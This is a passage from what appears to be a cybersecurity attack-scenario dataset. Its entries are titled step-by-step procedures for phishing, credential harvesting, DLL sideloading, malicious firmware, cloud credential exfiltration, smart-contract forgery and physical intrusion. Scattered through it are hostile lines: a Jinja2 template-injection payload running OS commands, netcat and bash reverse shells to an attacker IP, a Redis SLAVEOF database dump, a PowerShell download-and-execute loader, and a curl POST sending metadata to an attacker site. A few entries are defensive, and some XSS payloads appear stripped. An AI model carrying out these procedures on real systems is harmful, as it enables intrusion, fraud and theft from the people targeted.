Step 9: Victim may not realize the site was fake until funds disappear. Step 10: SMS phishing messages are often sent from overseas and difficult to trace. Step 11: Anti-smishing detection tools or telecom filters can block known phishing senders. Step 12: Prevention includes not clicking SMS links from unknown numbers and using wallet apps that never request info via text. Tools: SMS gateway spoofers, phishing kit links, fake shortening services

Hidden iFrame Injection in Smart Billboard. Billboard control panel displays ads via web interface. Ad name field accepts JavaScript inside iframe. Step 1: Access web panel for billboard controller.Step 2: Add new ad with name: .Step 3: Submit.Step 4: Watch live billboard feed; alert pops up.Step 5: Replace iframe source with phishing domain. Tools: Chrome DevTools, Burp

DLL Hijack in Rundll32.exe. Abuses rundll32.exe to sideload and execute malicious DLLs with crafted entry points. 1. Attacker writes a DLL with custom DllMain or exported function like Control_RunDLL.2. Executes rundll32.exe path\malicious.dll,EntryPoint.3. Since rundll32 is trusted and may run elevated, payload executes in that context.4. Often used in UAC bypass chains or persistence. Tools: rundll32.exe, malicious DLL

Password Harvesting via Transparent Login Overlay. A base64 image of a login screen is embedded in an email with invisible text input fields placed precisely over the username and password areas, tricking users into entering real credentials. Step 1: Attacker takes a screenshot of a real login page (e.g., Microsoft 365).Step 2: Encodes this screenshot as a base64 PNG and embeds in HTML email.Step 3: Places transparent input fields using CSS position:absolute; over the username and password fields.Step 4: Scripts attached to these fields capture keystrokes and submit them to an attacker's URL.Step 5: The email is sent with a subject like “Session Timed Out – Log Back In”.Step 6: Victim enters login credentials thinking it’s legitimate.Step 7: Credentials are stolen and saved for later account takeover. Tools: HTML/CSS Overlay, Email Designer, Base64 Tool

Timeline Gaps via $LogFile and MFT. Adversary tried to delete evidence and manipulate timestamps, leading to gaps in file system logs. 1. Extract $MFT and $LogFile from a disk image.2. Use MFTECmd and $LogFile parser to extract granular timestamps.3. Feed into Plaso for super timeline generation.4. Import into Timesketch.5. Identify periods of time with no file activity where there should be activity.6. Cross-check with known user behavior and business hours.7. Mark gaps as potential time-stomping or anti-forensic activity.8. Use USN Journal if available for deeper insight.9. Report findings and flag suspicious time ranges. Tools: Plaso, MFTECmd, $LogFile parser

Command Injection through Template Engines (e.g., eval()). Attackers inject malicious code in template variables that get executed unsafely via template engine eval. Step 1: Identify web app using template engines that support code execution, e.g., Jinja2, Twig, ERB. Step 2: Find user inputs that get rendered inside templates without proper sanitization. Step 3: Inject payloads in inputs like {{ 7*7 }}, then escalate to OS commands, e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 4: Observe rendered output or error messages confirming execution. Step 5: Try payloads that execute system commands (e.g., ls, whoami, cat [FILE_PATH]). Step 6: Use Burp Suite to automate injection attempts in different input fields. Step 7: If successful, upload webshells or establish reverse shells via command execution. Step 8: Exploit this for data theft, privilege escalation, or persistence. Step 9: Review all template variables and inputs for unsafe rendering. Step 10: Report and recommend disabling eval-like features, escaping inputs, and using safe templating practices. Tools: Burp Suite, Template tools

Malware-Laced Firmware in Uplink Controller. Tampered firmware update pre-installed in a third-party uplink controller. During system upgrades, engineers unknowingly install firmware with embedded logic bombs. The firmware, provided by a vendor compromised via supply chain attack, executes dormant code after 30 satellite commands are issued. The logic bomb reroutes telemetry to a remote C2 server while sending fake responses to the ground station. Tools: USB stick, Hex editor

HTML Smuggling via SVG-Encoded PowerShell Script. A PowerShell command is hidden inside SVG, loaded via HTML attachment and silently executed. Step 1: Attacker encodes PowerShell script inside SVG tag.Step 2: HTML uses JS to extract the description and save it as .ps1.Step 3: File appears as chart.html sent in email pretending to be a report.Step 4: Victim opens file, script saves install.ps1 to disk.Step 5: Execution triggered using mshta.exe silently.Step 6: Script runs spyware and opens hidden browser windows.Step 7: Attacker monitors victim activity remotely. Tools: SVG Editor, PowerShell, HTML

Historian Pivot via Scheduled Task Injection. Attacker compromises Historian and injects scheduled tasks to pivot to Engineering Workstation on reboot. Step 1: Gains initial shell on Historian using Metasploit. Step 2: Uses schtasks.exe to create a hidden task that runs PowerShell command at system startup. Step 3: Task contains encoded reverse shell payload targeting Engineering Workstation. Step 4: On reboot, scheduled task executes, reaching out to attacker-controlled listener. Step 5: Uses SharpRDP to exploit Engineering Workstation with newly gained foothold. Tools: Task Scheduler (schtasks.exe), PowerShell, SharpRDP

Acoustic-Based Polarization Detection via Microphone Array. Detects polarization switch via sound and uses timing to inject photons. Step 1: Deploy microphone array close to polarization modulator.Step 2: Capture acoustic signals of modulator switching.Step 3: Map sounds to basis values over training period.Step 4: Time photon injection with matching polarization.Step 5: Emit photons during matched sound events.Step 6: Use logs to confirm accepted bits.Step 7: Remove recording device post-lab session. Tools: Microphone array, Audio-to-polarization map, Pulse laser

Combined SMTP VRFY and Webmail Login Testing. After finding valid users via VRFY, attacker tries to log in to the webmail portal with default or guessed passwords. Step 1: Use VRFY over Telnet to get valid usernames like jane, itadmin, ceo. Step 2: Append domain to form emails (jane@target.com). Step 3: Visit target’s webmail portal (e.g., mail.target.com). Step 4: Try usernames with passwords like Welcome123, Company2024. Step 5: Log successful attempts and take screenshots. Step 6: Show how poor passwords + exposed users lead to compromise. Tools: Telnet, Web Browser

Fake vtable Call (C++). Attacker corrupts object’s vtable pointer, causing method call to go to malicious function Step 1: Identify C++ class with virtual method, pointer to vtable stored at object start. Step 2: Trigger buffer overflow that overwrites vtable pointer for object. Step 3: Write address of attacker-controlled fake vtable in memory. Step 4: When method is called on object, virtual dispatch jumps into fake vtable location. Step 5: Attacker’s code executes under process privileges. Step 6: Branch can lead to shell exec or memory access. Step 7: Defender: use CFI, vtable integrity checks, hardened C++ allocators. Tools: GDB, copy-paste PoC C++ code

OPC UA Reverse Shell via Misconfigured Method Node. Attacker leverages an exposed custom Method node in OPC UA to execute arbitrary system commands. Step 1: Scan OPC UA endpoint using UA Expert to find Method nodes.Step 2: Identify method nodes that accept string arguments (e.g., shell command).Step 3: Connect via Python-opcua script.Step 4: Call method with payload like nc attacker-ip 4444 -e [FILE_PATH] 5: On attacker's system, start listener with Netcat.Step 6: Upon method execution, gain reverse shell.Step 7: Interact with system and capture data. Tools: UA Expert, Python-opcua, Netcat

Power Line Glitch Attack. By tampering with the power line shared by IoT devices (e.g., smart home), attackers induce unpredictable faults across multiple targets simultaneously. Step 1: Set up a test environment with multiple IoT or embedded devices powered by the same source (e.g., USB hub, power strip). Step 2: Connect a power relay (Arduino-controlled or physical switch) between the power supply and the line going to devices. Use an oscilloscope to monitor the voltage stability. Step 3: Time your glitch during a sensitive operation (e.g., OTA update, password check, encrypted communication). Inject a short power dip (a millisecond or less) using the relay or a programmable power controller. Step 4: Observe device behavior: common faults include random reboots, corrupted memory, or authentication bypass. Step 5: Repeat the glitch during multiple boot phases or operations. Step 6: If a device enters debug mode, crashes, or skips validation, you've successfully induced a fault. Step 7: Optionally, log serial output or LED indicators to correlate faults with specific device actions. Tools: Power Supply Controller (e.g., Arduino Relay, Variac), Oscilloscope, Smart Plugs/IoT Devices

Reading BGA Flash using Socket Adapter. Dumping flash from BGA (Ball Grid Array) using socket adapter without soldering. Step 1: Open the device and gently remove the BGA flash chip (optional pre-removal step). Step 2: Place the BGA chip into a compatible socket adapter. Step 3: Connect the socket to a flash programmer like Dediprog. Step 4: Use software to read the contents to a .bin file. Step 5: Analyze or reverse the file as needed. Tools: BGA Socket Programmer, PC

Masquerade Falco Binary Location. Attacker places real Falco binary in an unused directory and creates a fake one at expected path. Attacker copies the real Falco binary to [FILE_PATH] and runs it from there. Then, creates a fake script at [FILE_PATH] that prints logs but does nothing. Defender checking the binary will think Falco is running normally. Attacker monitors alerts from hidden binary but prevents detection by defenders reviewing system status. Tools: cp, bash, systemctl

XSS in WalletConnect Session Info. WalletConnect sessions include metadata fields like peerMeta.name or description. These may be rendered unsanitized in confirmation UIs. Step 1: Attacker builds a fake DApp and integrates WalletConnect. Step 2: In the session initiation request, the attacker includes malicious metadata like peerMeta.name: " ". Step 3: Victim opens a legit wallet app (e.g., MetaMask Mobile) and scans the QR code to connect. Step 4: The wallet UI shows the DApp’s name/description pulled from the metadata — and if it isn’t sanitized, the script executes in the wallet’s UI. Step 5: This can trick the victim into signing fake transactions, redirecting funds, or running malicious UI code inside the wallet app. Step 6: Attack works even before the wallet fully connects. Step 7: This can compromise the wallet’s integrity and mislead users about what they’re interacting with. Tools: WalletConnect, mobile/web wallets, JS tools

Multi-Stage VBA Payload Delivery via Pastebin. Macro loads second-stage payload dynamically from Pastebin or GitHub to avoid static detection. 1. The attacker embeds a lightweight macro in the Office document.2. Macro runs: IEX (New-Object Net.WebClient).DownloadString('[URL]'), which fetches and executes a PowerShell second-stage payload.3. The second-stage payload can be a shellcode injector, C2 beacon, or persistence dropper.4. No payload is statically embedded in the document, bypassing signature-based AV.5. Payload remains dynamic—can be updated on Pastebin anytime to deliver different threats. Tools: VBA, Pastebin, PowerShell

Exploitation via Cross-Account S3 Bucket Policies. Attackers assume roles with read access to other AWS accounts’ S3 buckets due to overly permissive cross-account bucket policies and exfiltrate sensitive data. Step 1: Attacker gains access by assuming an IAM role with permissions to read objects from an S3 bucket in a different AWS account. Step 2: Verifies permissions by listing bucket contents or accessing known paths. Step 3: Downloads sensitive data or bucket contents using AWS CLI commands (e.g., aws s3 cp). Step 4: May combine this with reconnaissance to identify critical files or credentials. Step 5: Exfiltrates data to external systems or prepares it for further exploitation. Step 6: Attempts to maintain access by creating policies or roles allowing continuous bucket access. Step 7: Tries to cover tracks by deleting or modifying CloudTrail logs related to bucket access. Step 8: Uses exfiltrated data to escalate privileges or pivot into other systems. Tools: AWS CLI, Bucket policy analyzer

Checksum Collisions (ZIP/RAR). Attackers create two archive files (ZIP/RAR) with the same CRC32 or weak hash, but different content. This tricks systems relying only on checksums for file integrity (e.g., mod distribution, anti-virus exceptions). Step 1: Understand that ZIP files use CRC32, a 32-bit checksum, which is not cryptographically secure. Step 2: Use tools like zipcrc or collide to generate two ZIPs (archive1.zip, archive2.zip) with different content but same CRC. Step 3: One archive contains a clean file (readme.txt), and the other contains malware with the same file name. Step 4: Validate both archives with tools like 7-Zip or antivirus — they report identical checksums. Step 5: Submit archive1.zip for whitelisting or pass it through security gates. Step 6: Later swap in archive2.zip, which bypasses checks due to matching checksum. Step 7: Attackers often use this technique for mod files, installers, or to fool users into executing malicious versions. Step 8: Always use SHA-256+ or digital signatures for file verification. Tools: 7-Zip, WinRAR, zipcrc, collide, Hex editor

Identifying Type Confusion in PDF Reader. A type confusion bug causes misinterpretation of object types during PDF parsing, leading to crash. 1. Fuzz PDF reader with AFL++ using mutated PDFs. 2. Monitor crashes and use WinDbg to analyze call stack. 3. Use Ghidra to reverse the parser logic where an object type assumption is made. 4. Confirm mismatch between allocated type and accessed type. 5. Check crash at virtual function call — indicates type confusion. 6. Analyze control flow redirection potential. 7. CVSS: low privileges, user interaction required, partial integrity compromise. 8. Classify as type confusion with sandboxed user-mode impact. Tools: Ghidra, AFL++, WinDbg, CVSS Calculator

Host Namespace Reuse in Docker Build Container. Build container is started with --network=host and --pid=host, allowing process snooping. 1. Developer sets CI runner to use --network=host and --pid=host for faster builds.2. Build container now shares network and process namespace with host.3. Attacker's build script runs ps aux or netstat to list host processes or connections.4. They identify open ports or sensitive processes (e.g., SSH, database).5. Attacker sends exfiltration script using that information.6. Fix: Never share host namespaces in CI/CD containers. Tools: Docker, ps, netstat

Time-Bandit Attack. Miner withholds mined blocks and selectively re-mines them to reorder transactions for personal profit. Step 1: A miner successfully mines a block but chooses not to broadcast it immediately to the network, withholding it privately. Step 2: Instead of releasing the block, the miner continues mining on top of the withheld block to try and build a longer private chain (secret fork). Step 3: The miner strategically reorders transactions in the withheld block or newly mined blocks to prioritize their own profitable transactions (e.g., front-running trades, sandwich attacks). Step 4: When the miner’s private chain surpasses the length of the public chain, they release it to the network, causing a chain reorganization (reorg). Step 5: This reorg invalidates some transactions from the original public chain and replaces them with the attacker’s reordered transactions, allowing the attacker to capture more profit. Step 6: This process can be repeated multiple times to maximize profits, especially during volatile market conditions. Step 7: Detection involves monitoring unexpected chain reorganizations, unusual block withholding times, and miner behavior analytics. Step 8: Mitigation includes improving consensus protocols to penalize selfish mining, incentivizing prompt block propagation, and monitoring miner network activity. Tools: Mining software, blockchain explorers

Lateral Movement via Exploiting Redis Misconfig. Use of Redis SLAVEOF or module load to execute code in internal Redis server. 1. Attacker accesses Redis with no AUTH from container.2. Uses SLAVEOF attacker-ip 6379 to exfiltrate all DB to remote Redis.3. Optionally loads malicious module using MODULE LOAD [FILE_PATH] if module loading is enabled.4. Module crafted to spawn shell or execute arbitrary commands.5. Executes commands like ! bash -i >& [FILE_PATH] 0>&1 from Redis.6. This gives reverse shell to attacker.7. Attack is very stealthy if Redis runs in isolated VPC or subnet with poor monitoring. Tools: redis-cli, nc, msfvenom

REST to SOAP API Protocol Confusion Exploits. In hybrid systems, REST and SOAP coexist. An attacker sends SOAP-like payloads to REST endpoints (or vice versa), exploiting parsing confusion to bypass logic or WAF rules. Step 1: Identify APIs that support both REST and SOAP endpoints (e.g., /rest/ and /soap/). Step 2: Try sending SOAP envelope payloads (XML) to REST endpoints that usually accept JSON. Step 3: For example, send a POST request to /api/rest/user with a SOAP XML body. Step 4: If the API accepts and processes it, it indicates protocol confusion. Step 5: Use this to bypass firewalls or WAFs that expect only JSON or REST formats. Step 6: Try injecting data into parameters embedded within XML or REST query strings. Step 7: Observe differences in how inputs are interpreted. Step 8: Document endpoints accepting mismatched protocol formats. Step 9: Recommend strict content-type enforcement and request body validation. Step 10: Retest with mixed formats — they should now be rejected with proper HTTP 400. Tools: Postman, SoapUI, Burp Suite

Message Forgery via Weak Cryptography. Poorly implemented cryptographic signing or validation (e.g., use of ecrecover without checks, short keys, or malleable signatures) can allow attackers to forge messages or spoof identities. This leads to unauthorized transfers, approvals, or validator impersonation. Step 1: The attacker identifies a smart contract (e.g., a bridge, DAO, or DeFi platform) that uses digital signatures for authorization (e.g., approve transfer, mint token, confirm bridge transaction). The contract uses ecrecover to recover the signer from a message and signature. Step 2: The attacker inspects the contract source code (via Etherscan or Hardhat) and discovers weak cryptographic implementation — for example, no protection against signature malleability (i.e., both (r, s) and (r, -s mod n) are valid), or ecrecover used without input validation. Step 3: The attacker crafts a forged signature by modifying the s value or flipping bits to produce a different but valid signature. Some smart contracts incorrectly verify signatures without enforcing low-s or canonical format rules. Step 4: Alternatively, the contract might accept empty signatures, fixed v values, or ignore signer mismatches. Step 5: Using the forged signature, the attacker submits a transaction that appears to be signed by a valid user (e.g., an admin or validator). Step 6: The contract accepts the signature and executes privileged actions like transferring tokens, bridging funds, or approving contract ownership changes. Step 7: In more advanced cases, poor randomness or improper use of signing libraries can leak private keys or allow recovery using public data (especially in weak ECDSA implementations). Step 8: Detection includes monitoring abnormal signature formats and checking for multiple transactions with altered s or v values. Step 9: To prevent this, developers must use hardened signature verification libraries, enforce s < secp256k1n/2 (low-s rule), validate message structure, and check that the recovered signer matches the intended address. Step 10: Never use custom cryptography unless audited; always apply EIP-2 and EIP-712 rules strictly in all signature verification logic. Tools: Remix, Ethers.js, Custom ECDSA scripts

Invalid Merkle Proof or State Root Acceptance. Bridges often use Merkle proofs to verify cross-chain data (like deposits or validator votes). If the proof or state root isn’t validated properly, attackers can submit fake data to unlock tokens or alter state on the destination chain. Step 1: Many modern bridges rely on Merkle trees or Patricia trees to prove that an event (e.g., token lock) occurred on the source chain. The bridge contract on the destination chain accepts a Merkle proof showing this event is part of a known root. Step 2: The attacker finds that the contract accepts any root hash or uses outdated/hardcoded roots. Step 3: The attacker crafts a fake Merkle proof, claiming that a deposit happened in the source tree. Step 4: Since the contract does not verify that the submitted root is correct, it assumes the proof is valid and unlocks tokens. Step 5: Alternatively, the attacker may submit a valid proof for a different tree, if the bridge does not scope roots to specific block heights or epochs. Step 6: Some bridges accept state roots submitted by validators or relayers — if those are not verified properly, the attacker may impersonate a validator or relay false state roots. Step 7: With either flaw, the attacker unlocks real tokens from the bridge contract using fake or replayed proof data. Step 8: The exploit can be silent and repeatable, especially if state roots are updated off-chain and not verified on-chain. Step 9: Detection involves checking that Merkle roots match trusted checkpoints or validator-set consensus. Step 10: Developers must always verify submitted roots, scope them to chain epochs, reject stale/future proofs, and log every proof validation attempt for audit. Tools: Merkle Tree Simulators, Hardhat, Ethers.js

GitLab CI Compiled Backdoor Delivered via Cache Injection. Attacker poisons CI build cache with compiled binary backdoor 1. Contributor alters binary source file to include backdoor behavior.2. After build, ccache stores the compiled artifact.3. Next pipeline reuses this cache without revalidation, linking the poisoned object into release binary.4. The backdoor sends heartbeat to external host on magic packet.5. Incident triggers when external firewall logs show consistent outbound traffic at job deploy time.6. Binary diffing confirms injected code segment not part of source tree.7. Cache is flushed, and cache policy now includes commit hash scoping.8. Reproducible builds enforced using secure hashes and isolated environments. Tools: GitLab CI, GCC, ccache

MITM via APK Repack + Proxy Override. Some Android apps do not validate their network configuration or certificate pinning. An attacker can decompile the APK, modify network code to force use of a proxy, recompile the app, and capture or modify the app’s traffic even over HTTPS. Step 1: Use apktool d vulnerable.apk to decompile the APK. Step 2: Navigate to smali or res/xml directories and locate network-related configuration (e.g., network_security_config.xml, okhttp settings). Step 3: Modify the config to allow cleartext traffic or reroute traffic via a proxy (e.g., change base URL to [URL] Step 4: Optionally, remove SSL pinning logic from smali code (remove certificate checks or TrustManager validation). Step 5: Rebuild the APK using apktool b vulnerable -o modded.apk. Step 6: Sign the APK using jarsigner or uber-apk-signer with a test key. Step 7: Install the modified APK on an Android emulator using adb install modded.apk. Step 8: Set up Burp Suite and configure it to intercept HTTP/HTTPS on port 8080. Step 9: Launch the modified app and perform login or actions. Burp Suite will now capture traffic, even HTTPS, if pinning was removed. Step 10: Analyze or tamper with requests/responses using Burp or inject payloads. You've now MITM'd a mobile app by repacking the APK to override the proxy and SSL configuration. Tools: JADX, Apktool, Burp Suite, Android Emulator, Keytool

Passive Sniffing of Beacon Frames. Attacker listens passively to beacon frames broadcast by wireless access points to identify network SSIDs, BSSIDs, and channels without transmitting any packets. Step 1: Attacker enables monitor mode on their wireless NIC to passively capture all wireless frames on a chosen channel or via channel hopping. Step 2: Use tools like airodump-ng or Wireshark to filter and capture beacon frames, which are periodically broadcast by wireless access points to announce their presence. Step 3: Extract information from beacon frames such as SSID (network name), BSSID (MAC address of AP), supported data rates, security protocols, and operating channel. Step 4: Compile a list of visible wireless networks with details needed for further attacks like rogue AP setup or targeted association attacks. Step 5: Since this is passive listening, no packets are transmitted by the attacker, making detection extremely difficult. Step 6: Use gathered info to map wireless landscape and identify potential targets. Step 7: Repeat scanning on multiple channels or use channel hopping to discover all networks within range. Step 8: Detection requires monitoring for devices constantly scanning or in monitor mode, which is non-trivial. Step 9: Mitigation includes hiding SSIDs where feasible, enforcing strong authentication and encryption, and regularly auditing wireless environments. Step 10: Educate network admins on wireless reconnaissance risks and detection techniques. Tools: Wireshark, tcpdump, airodump-ng

Standard DNS Query Encoding. Attackers encode commands or data inside DNS query subdomains (e.g., cmd123.attacker.com) to receive instructions covertly Step 1: Attacker sets up a DNS server that controls a domain (e.g., attacker.com). Step 2: Malware or compromised host on victim machine encodes commands or exfiltrated data into DNS query subdomains (e.g., cmd123.attacker.com). Step 3: The victim's DNS resolver sends these specially crafted DNS queries to the attacker's DNS server. Step 4: Attacker’s server decodes these queries to extract commands or received data. Step 5: Victim device periodically sends encoded DNS queries to receive further instructions from attacker. Step 6: All data is sent inside normal DNS traffic, often bypassing firewalls and monitoring due to DNS whitelisting. Step 7: Detection involves analyzing unusual DNS query patterns such as high entropy subdomains, unusual frequency, or excessive DNS traffic to unknown domains. Step 8: Mitigation includes restricting DNS queries to trusted resolvers, DNS filtering, and monitoring DNS traffic for anomalies. Tools: Iodine, DNSCat2, dig, tcpdump

Improper Permissions on Files/Directories. Some web servers or apps set weak permissions on files/folders (e.g., readable/writable by all users). This allows attackers to access sensitive files like config files, credentials, or logs, or even overwrite or delete them. On Linux, chmod 777 is often misused. On Windows, folders may be marked “Everyone: Full Control.” These misconfigs can expose backups, DBs, or credentials. ✅ Step 1: Understand the Concept- Files/directories have permissions that control who can read/write/execute them- Insecure permissions allow attackers to:Read secret filesUpload/modify dataExecute unauthorized programs📌 Example: A config file config.php with DB password is readable by everyone✅ Step 2: Setup a Vulnerable Web Server (Safe Test)1. Install XAMPP (or use WAMP/LAMP)2. Create a folder: htdocs/test_perms3. Inside, create 2 files: - index.html → normal file - secret.txt → write this inside: DB_PASSWORD=topsecret1234. Set loose permission:bash chmod 777 secret.txt ✅ Now secret.txt is world-readable and writable✅ Step 3: Simulate Attacker Behavior (Web Side)1. Visit: [URL] You can directly view the contents of the file (password)2. Try uploading a PHP file if directory is writable✅ If directory has chmod 777, attacker may upload shell✅ Step 4: Simulate Attacker on Local/Remote Machine1. Open terminal:bash ls -l test_perms/ ✅ Check for files with -rwxrwxrwx → full access for all users2. Run:bash cat test_perms/secret.txt ✅ You see sensitive info (no permission restrictions)✅ Step 5: Windows Version (Optional)1. Right click on folder → Properties → Security2. Add “Everyone” → Full Control✅ Anyone on the system/network can now read/edit files✅ Step 6: Real-World Attacks📌 Magento eCommerce Stores (2018)- var/export directory was world-readable- Hackers accessed exported user/customer databases📌 Yahoo! Data Breach- Misconfigured file permissions led to key logger script upload📌 Tesla AWS Cloud Exposure- Kubernetes dashboard accessible without auth- Allowed access to configuration and secrets stored in files✅ Step 7: Detection TechniquesOn Linux:bash find [FILE_PATH] -type f -perm -o+w find / -type d -perm 777 2>/dev/null ✅ Lists files or folders world-writableOn Windows:powershell icacls [FILE_PATH] /T ✅ Shows ACL (Access Control List) for all usersUse LinPEAS or WinPEAS (For Privilege Escalation)These scripts highlight insecure permissions✅ Step 8: Secure File Permissions (Fixes)On Linux:bash chmod 644 *.php chmod 600 config.php chmod 700 admin/ ✅ Read by owner, no write access for group/worldOn Windows:1. Right click → Properties → Security2. Remove “Everyone” from sensitive directories✅ Best Practices:1. Never use chmod 777 in production2. Store secrets outside of webroot3. Limit write access only to trusted users4. Monitor file integrity using tools like Tripwire✅ Bonus: Prevent Overwrite Upload Attacks- Rename uploaded files- Store uploads outside web directory- Use random or hashed filenames to prevent file overwrite Tools: Browser, Kali Linux, CMD/Terminal, ls, cat, icacls, Burp Suite, local test server

Gas Parameter Manipulation. Attacker modifies gasLimit/gasPrice fields in transaction payload to increase cost, break tx, or manipulate MEV (miner extractable value). Step 1: Attacker tricks victim into using a malicious DApp that either suggests or auto-fills wrong gas parameters (gas price too high, gas limit too low). Step 2: Victim proceeds with transaction where the gasLimit is intentionally set too low to revert after consuming fees, or too high to cause overpayment. Step 3: Alternatively, attacker uses a spam bot to flood mempool with high gas-price txs, forcing victim to pay more to get mined in time (e.g., for NFT mint or liquidation). Step 4: Victim overpays or fails the transaction due to these altered parameters. Step 5: In MEV scenarios, attacker may front-run txs by placing a high-gas tx just before victim’s, profiting from slippage or arbitrage. Step 6: In worst case, attacker creates a gas-griefing attack to revert legitimate txs while pocketing MEV rewards. Step 7: These attacks exploit user inattention to gas fields and wallet UI. Step 8: Detection is hard unless user reads raw tx or checks real-time gas metrics. Tools: Custom Wallet UI, Gas Spammer Bots

HID Spoofing with Malicious Keyboard. Attacker replaces keyboard with one that looks identical but has a hidden chip to record or transmit keystrokes. Step 1: Buy a keyboard with hidden keylogger chip (MalDuino).Step 2: Tailgate or distract a user and swap their keyboard silently.Step 3: The malicious keyboard starts recording all keystrokes.Step 4: Data is stored on the chip or sent wirelessly.Step 5: Retrieve the keyboard later or collect data remotely. Tools: MalDuino, Lookalike Keyboard

Replay Attack to Unlock Vehicle Doors. Attacker replays a captured CAN frame that unlocks car doors 1. Connect CANtact to the vehicle’s OBD-II port.2. Start candump to monitor live CAN traffic.3. Press the unlock button and capture the related CAN ID and data.4. Save the packet using can-utils.5. Re-inject the same packet with cansend while the key fob is far away.6. Observe that the car unlocks without original key interaction.7. Repeat to verify replayability. Tools: CANtact, Wireshark, ICSim

Preserving Log Integrity Before Archival. A system administrator needs to ensure that system logs are unaltered before being archived. 1. Set up Filebeat to collect and forward logs to a central secure server. 2. Use Tripwire to monitor log file integrity at rest. 3. Define checksum policies to detect any unauthorized changes. 4. Rotate and compress logs weekly using secure shell scripts. 5. Store compressed archives in a WORM (Write Once Read Many) storage solution. 6. Record the hash and storage path in the inventory register. 7. Test restoration procedures periodically to verify access and validity. Tools: Syslog-ng, Tripwire, Filebeat

Captive Portal Injection. After client connects to Evil Twin, attacker injects a phishing captive portal (e.g., login form, payment request) to steal credentials or card info. Step 1: After setting up Evil Twin and DHCP, redirect HTTP requests using a captive portal solution like Wifiphisher or nodogsplash. Step 2: If using Wifiphisher, run: wifiphisher -aI wlan0 -jI wlan1 (1 adapter for AP, 1 for Internet spoofing). Step 3: Wifiphisher auto-creates AP, handles DHCP, and injects phishing pages (e.g., fake login, firmware update prompt). Step 4: Alternatively, use Flask to create a custom login page (e.g., “Please login to access Free Wi-Fi”). Step 5: Serve this page using Python HTTP server or Apache on port 80. Step 6: Redirect all HTTP requests to your portal using dnsmasq or iptables. Step 7: When users connect and submit credentials, capture and store them in a backend file. Step 8: Optionally redirect user to real page to reduce suspicion. Step 9: Combine with sslstrip or DNS spoofing to enhance phishing. Step 10: Analyze logs after test. Legal use only in testbeds or with written approval. Tools: Wifiphisher, nodogsplash, Flask, dnsmasq

Race Between malloc/free in Threads. Threads race between malloc and free, exposing stale heap pointer or triggering use-after-free Step 1: Two threads operate on same shared object (e.g., buffer or task queue). Step 2: Thread A frees object while Thread B is still using it. Step 3: Thread B accesses freed memory, reading stale data or crashing. Step 4: Attacker exploits this by racing to trigger UAF, corrupting pointer, or leaking heap structure. Step 5: This bug is hard to reproduce but dangerous. Step 6: Defender must use mutex locks, atomic operations, or thread-safe data structures (e.g., std::shared_ptr). Step 7: Tools like ThreadSanitizer or Valgrind can detect this during testing. Tools: Thread sanitizer, valgrind, C/C++

Smart Fan XSS via Web Control Panel. Web-based fan control allows changing fan modes with no input filtering. Step 1: Access fan panel at [IP_ADDRESS].Step 2: Navigate to “Modes”.Step 3: Edit Mode name to .Step 4: Save.Step 5: Reload dashboard — script executes.Step 6: Replace payload with malicious JS to phish credentials. Tools: DevTools, Burp

Sticky Note Password Harvest. Attacker searches desks during breaks for passwords written on sticky notes. Step 1: Roam office during lunch or cleaning hours.Step 2: Look for sticky notes or papers stuck to monitors or under keyboards.Step 3: Take photo or note down usernames and passwords.Step 4: Use captured credentials to log into systems later.Step 5: Erase traces if anything is touched. Tools: Camera or Mobile Phone

Basic Underflow in Subtraction. Subtracting from unsigned integer causing underflow where result goes below zero and wraps to max uint value. Example: subtracting 1 from 0 in uint256 results in max uint256. Step 1: Find a smart contract function that subtracts from an unsigned integer without checks. Step 2: Confirm variable type (e.g., uint256) and its min/max values. Step 3: Supply inputs to cause subtraction below zero (e.g., current value 0 - 1). Step 4: The subtraction underflows, wrapping around to max uint256 instead of negative value (which unsigned ints cannot represent). Step 5: This may allow attackers to bypass balance checks, decrease counters below zero, or cause denial of service. Step 6: Attackers exploit this by sending transactions triggering underflow and manipulating contract logic or balances. Step 7: Detect through unit testing, static analysis, and monitoring unexpected large values in state variables. Step 8: Fix by upgrading to Solidity 0.8+ with built-in underflow checks or using SafeMath subtraction functions. Tools: Solidity compiler, Remix IDE

Remote DPA over Power Profiling. Monitor power usage from a distance (e.g., via RF sensors, EMI pickup) to infer cryptographic operations. Step 1: Identify device power frequency band using SDR or oscilloscope. Step 2: Capture power signature remotely during crypto operation. Step 3: Align and clean traces using filters and FFT. Step 4: Run CPA/DPA on suspected blocks of power usage. Step 5: Infer key bits through correlation. Tools: RF probes, Remote EM sensors, SDR

Fake SaaS Integration or Monitoring Tools. Attackers publish VM/container images to the cloud marketplace with pre-installed "monitoring agents" or "SaaS integration agents" that look like popular tools (e.g., Datadog, Prometheus, Sumo Logic). These agents silently collect environment metadata, credentials, API tokens, and logs — sending them to attacker-controlled domains. These tools appear helpful but are actually spyware with no legitimate function. Users deploying such images unknowingly leak sensitive information. Step 1: Attacker creates a new VM using Ubuntu or Amazon Linux. Step 2: They install common system monitoring paths like [FILE_PATH], [FILE_PATH], or [FILE_PATH] — but instead of real agents, they place custom Python/bash scripts that collect environment metadata using commands like curl [URL] (AWS), or gcloud auth list (GCP). Step 3: These fake agents bundle and send this metadata via HTTPS to the attacker's server (e.g., using curl -X POST attacker.site/api with JSON data). Step 4: Attacker configures systemd services or cron jobs to ensure these scripts run on startup or every few minutes. Step 5: The attacker publishes the image to the cloud marketplace with a name like “Datadog Enabled Cloud Base” or “Observability Optimized Ubuntu for DevOps”. Step 6: A DevOps engineer or small company launches this image thinking it includes built-in monitoring or integrates with SaaS products. Step 7: Upon boot, the malicious agents immediately collect data (IAM roles, environment variables, credentials) and transmit it silently to the attacker. Step 8: Since these tools are placed under trusted paths and logs are clean or missing, victims don’t notice. Step 9: The attacker can extract IAM credentials or even access tokens and use them to gain access to the victim’s cloud environment. Step 10: If unnoticed, attacker maintains access and continuously harvests new credentials or system configurations, resulting in major compromise. Tools: Python, bash, curl, netcat, fake binaries, AWS CLI, GCP CLI, cloud SDKs

DOM-Based XSS via Unsafe JavaScript Manipulation. Scripts modify the page DOM using unsafe user-controlled data, leading to XSS. Step 1: Identify JavaScript code that reads user input from URL, cookies, or localStorage and inserts into DOM without sanitization. Step 2: Inject payloads in URL fragments or parameters like # alert(1) . Step 3: Load the page and observe if the script executes as DOM is updated. Step 4: Use browser dev tools to inspect where input is used in DOM. Step 5: Craft payloads that exploit DOM APIs (e.g., document.write(), innerHTML). Step 6: Test with different browsers and inputs. Step 7: Document vulnerable scripts and input sources. Step 8: Recommend sanitizing data before inserting into DOM and using safe DOM methods like textContent. Step 9: Suggest Content Security Policy (CSP). Step 10: Update JavaScript libraries or frameworks. Tools: Browser Dev Tools, Burp Suite

